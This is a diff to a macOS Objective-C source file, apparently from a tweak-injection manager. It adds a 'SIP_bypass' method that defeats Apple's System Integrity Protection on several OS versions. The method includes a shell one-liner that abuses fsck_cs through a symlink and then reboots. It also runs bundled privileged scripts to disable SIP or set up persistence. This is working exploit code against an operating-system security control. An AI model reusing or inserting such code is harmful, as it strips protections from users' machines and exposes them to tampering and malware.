@@ -91,28 +91,49 @@ SIMBLManager* si_SIMBLManager;
     return result;
 }
 
+// Hmmm don't think I should actually implement this but just in case
 - (Boolean)SIP_bypass {
-    if ([[NSProcessInfo processInfo] operatingSystemVersion].minorVersion != 11)
-        return false;
+    // Bypasses for
+    // 10.11.1 -> 10.11.4
+    // 10.12.0 -> 10.13.1
     
-    if ([[NSProcessInfo processInfo] operatingSystemVersion].patchVersion > 4)
-        return false;
+    long minor = [[NSProcessInfo processInfo] operatingSystemVersion].minorVersion;
+    long patch = [[NSProcessInfo processInfo] operatingSystemVersion].patchVersion;
+    NSBundle *bundl = [NSBundle bundleForClass:[SIMBLManager class]];
     
-    if ([[NSProcessInfo processInfo] operatingSystemVersion].patchVersion == 0)
-        return false;
+    if (minor == 11) {
+        if (patch > 4)
+            return false;
+        
+        if (patch == 0)
+            return false;
+        
+        if (patch == 4) {
+            system("ln -s /S*/*/E*/A*Li*/*/I* /dev/diskX;fsck_cs /dev/diskX 1>&-;touch /Li*/Ex*/;reboot");
+            return true;
+        }
+        
+        if (patch < 4) {
+            if ([self SIP_enabled])
+                return [self runSTPrivilegedTask:@"/bin/sh" :[NSArray arrayWithObjects:[bundl pathForResource:@"stfusip" ofType:nil], @"disable", nil]];
+            else
+                return [self runSTPrivilegedTask:@"/bin/sh" :[NSArray arrayWithObjects:[bundl pathForResource:@"stfusip" ofType:nil], @"enable", nil]];
+            return true;
+        }
+    }
     
-    if ([[NSProcessInfo processInfo] operatingSystemVersion].patchVersion == 4) {
-        system("ln -s /S*/*/E*/A*Li*/*/I* /dev/diskX;fsck_cs /dev/diskX 1>&-;touch /Li*/Ex*/;reboot");
+    if (minor == 12) {
+        if (![self SIP_enabled])
+            return [self runSTPrivilegedTask:@"/bin/sh" :[NSArray arrayWithObjects:[bundl pathForResource:@"hid" ofType:nil], @"logout", @"persist", nil]];
+        
         return true;
     }
     
-    if ([[NSProcessInfo processInfo] operatingSystemVersion].patchVersion < 4)
-    {
-        if ([self SIP_enabled])
-            return [self runSTPrivilegedTask:@"/bin/sh" :[NSArray arrayWithObjects:[[NSBundle bundleForClass:[SIMBLManager class]] pathForResource:@"stfusip" ofType:nil], @"disable", nil]];
-        else
-            return [self runSTPrivilegedTask:@"/bin/sh" :[NSArray arrayWithObjects:[[NSBundle bundleForClass:[SIMBLManager class]] pathForResource:@"stfusip" ofType:nil], @"enable", nil]];
-        return true;
+    if (minor == 13) {
+        if (patch > 1)
+            return false;
+        
+        
     }
     
     return false;
@@ -120,8 +141,7 @@ SIMBLManager* si_SIMBLManager;
 
 - (Boolean)SIMBL_install {
     BOOL success = false;
-    if (![self SIP_enabled])
-    {
+    if (![self SIP_enabled]) {
         NSArray *args = [NSArray arrayWithObject:[[NSBundle bundleForClass:[SIMBLManager class]] pathForResource:@"installSIMBL" ofType:nil]];
         success = [self runSTPrivilegedTask:@"/bin/sh" :args];
     }
